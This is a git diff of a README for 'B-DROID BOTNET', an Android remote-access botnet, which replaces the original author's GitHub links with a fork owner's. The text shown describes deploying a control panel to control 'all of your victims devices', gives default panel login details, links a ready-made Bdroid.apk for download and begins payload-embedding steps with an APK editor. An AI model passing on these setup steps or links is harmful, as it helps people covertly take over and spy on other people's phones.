@@ -1,7 +1,7 @@
-<p align="center"><a href="https://github.com/botolmehedi/BDROID"><img title="BDROID" src="https://i.ibb.co/PgFYh4K/20220325-110329.png"></a>
+<p align="center"><a href="https://github.com/casperhonny/BDROID"><img title="BDROID" src="https://i.ibb.co/PgFYh4K/20220325-110329.png"></a>
 
 <p align="center">
-<a href="https://github.com/botolmehedi"><img title="Author" src="https://img.shields.io/badge/By-Botol--Baba-red.svg?style=for-the-badge&logo=github"></a>
+<a href="https://github.com/casperhonny"><img title="Author" src="https://img.shields.io/badge/By-Botol--Baba-red.svg?style=for-the-badge&logo=github"></a>
 </p>
 
 <h1 align="center">B-DROID BOTNET</h1>
@@ -36,10 +36,10 @@ Android 5 to Android 10. Working Without Any Error.
 * Create a New Account here [Deta.sh](https://deta.sh)
 
 * Now Deploy To Deta : 
-[![Deploy](https://button.deta.dev/1/svg)](https://go.deta.dev/deploy?repo=https://github.com/BotolMehedi/BDROID)
+[![Deploy](https://button.deta.dev/1/svg)](https://go.deta.dev/deploy?repo=https://github.com/casperhonny/BDROID)
 
 * After Successfully Deployed, Copy That Link. This is Your Control Panel. You Can Control All of Your Victims Devices From Here.
-<a href="https://github.com/botolmehedi/BDROID"><img title="BDROID" src="https://user-images.githubusercontent.com/64999484/160270463-cd7a4097-ee08-4181-b3d3-b91e2190c6e7.png"></a>
+<a href="https://github.com/casperhonny/BDROID"><img title="BDROID" src="https://user-images.githubusercontent.com/64999484/160270463-cd7a4097-ee08-4181-b3d3-b91e2190c6e7.png"></a>
 
 ⭐ Control Panel Default Login
 * User : botol
@@ -49,7 +49,7 @@ Android 5 to Android 10. Working Without Any Error.
 
 ⭐ Download This
 * [Apk Editor Pro](https://apkmody.io/apps/apk-editor)
-* [Bdroid Readymade Version](https://raw.githubusercontent.com/BotolMehedi/BotolMehedi/master/Bdroid.apk)
+* [Bdroid Readymade Version](https://raw.githubusercontent.com/casperhonny/BotolMehedi/master/Bdroid.apk)
 
 ⭐ Payload Setup
 * Open APK EDITOR PRO & Open with 'SELECT APK FILE'
